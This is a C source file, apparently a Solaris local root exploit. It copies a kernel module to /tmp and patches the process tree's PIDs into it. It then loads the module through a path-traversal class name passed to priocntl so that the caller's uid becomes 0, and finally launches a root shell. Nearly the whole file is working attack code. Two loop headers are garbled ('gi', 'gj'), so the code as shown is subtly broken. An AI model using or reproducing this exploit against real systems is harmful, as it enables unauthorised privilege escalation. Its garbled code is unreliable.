/*
   Writen By CatDog
   the module find the user's proccess's cred struct
   change it's owner uid to 0(root)
   this code can work properly in any conditions

Links:
support@catdogsoft.com
http://www.catdogsoft.com/S8EXP/

Reference:
jerryhj@yeah.net
http://www.hacker.com.cn/newbbs/dispbbs.asp?boardID=8&RootID=23110&ID=23110

*/

#include <stdio.h>
#include <sys/types.h>
#include <procfs.h>
#include <unistd.h>

#include <errno.h>
#include <sys/priocntl.h>
#include <sys/rtpriocntl.h>
#include <sys/tspriocntl.h>

#define OFFSET   0x2dc
#define OFFSET64 0x39c

pid_t 
getpppid(pid_t pid)
{
  psinfo_t psinf;
  int fd;
  char buf[256];

  sprintf(buf, "/proc/%d/psinfo", pid);
  fd=open(buf,0);
  if (fd!=-1) {
    read(fd, &psinf, sizeof(psinfo_t));
    close(fd);
  }

  return psinf.pr_ppid;
}

void Load(int m64)
{
  pcinfo_t pcinfo;
  if (!m64)
    strcpy(pcinfo.pc_clname, "../../../tmp/flkm32");
  if (m64)
    strcpy(pcinfo.pc_clname, "../../../tmp/flkm64");

  priocntl(0,getpid(),PC_GETCID,(caddr_t)&pcinfo);
}

main(int argc,char *argv[])
{
  pid_t pid;
  pid_t ptree[20], *pptree;
  int i,j,k;
  int fd;
  int m64=0;

  if (argc==2) {
    if (atoi(argv[1])==64) m64=1;
  }

  printf("is 64 bit: %d\n",m64);

  pid=getpid();
  memset(ptree, 0, 20*sizeof(pid_t));

  ptree[0]=pid;
  for (gi=1;i<20;i++) {
    pid=getpppid(pid);
    if (pid==0) break;
    ptree[i]=pid;
  }
  pptree=(pid_t *)malloc((i+1)*sizeof(pid_t));

  k=0;
  for (gj=19;j>=0;j--) {
    if (ptree[j]==0) continue;
    //printf("%d %x\n", ptree[j], ptree[j]);
    pptree[k]=ptree[j];
    k++;
  }
  pptree[k]=0xffffffff;

  if (!m64) system("cp -f flkm32 /tmp/flkm32");
  if (m64)  mkdir("/tmp/sparcv9",0777);
  if (m64)  system("cp -f flkm64 /tmp/sparcv9/flkm64");

  if (!m64) fd=open("/tmp/flkm32",2);
  if (m64)  fd=open("/tmp/sparcv9/flkm64",2);

  if (fd!=-1) {
    if (!m64) lseek(fd, OFFSET, SEEK_SET);
    if (m64)  lseek(fd, OFFSET64, SEEK_SET);
    printf("%d bytes to write\n", i*sizeof(pid_t));
    k=write(fd, pptree, i*sizeof(pid_t));
    printf("%d bytes wroten\n", k);
    close(fd);
  } else {
    printf("err! open flkm error!\n");
    exit(-1);
  }
  free(pptree);

  Load(m64);
  printf("id=%d\n", k=getuid());

  if (!m64) {
    system("rm -fr /tmp/flkm32");
  }
  if (m64) {
    system("rm -fr /tmp/sparcv9");
  }

  if (k==0) {
    printf("SUCCESS! Enjoy RootShell!\n");
    execl("/bin/sh","sh",NULL);
  } else {
    printf("fail!\n");
  }
}

